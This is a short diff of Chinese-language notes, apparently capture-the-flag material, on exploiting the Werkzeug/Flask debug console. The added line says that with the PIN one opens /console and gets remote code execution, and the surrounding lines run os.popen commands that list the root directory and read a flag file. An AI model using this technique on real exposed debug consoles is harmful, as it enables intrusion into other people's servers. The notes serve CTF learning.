@@ -35,6 +35,7 @@ docker环境: /proc/self/cgroup里面…/docker/后面的内容
 
 ^
 ## **控制台利用**
+有了pin，然后报错或访问/console进，点击一个条列的右边有一个终端按钮，点击进入控制台rce
 ```
 os.popen("ls -l /").read()
 os.popen("cat /this_is_the_flag.txt").read()
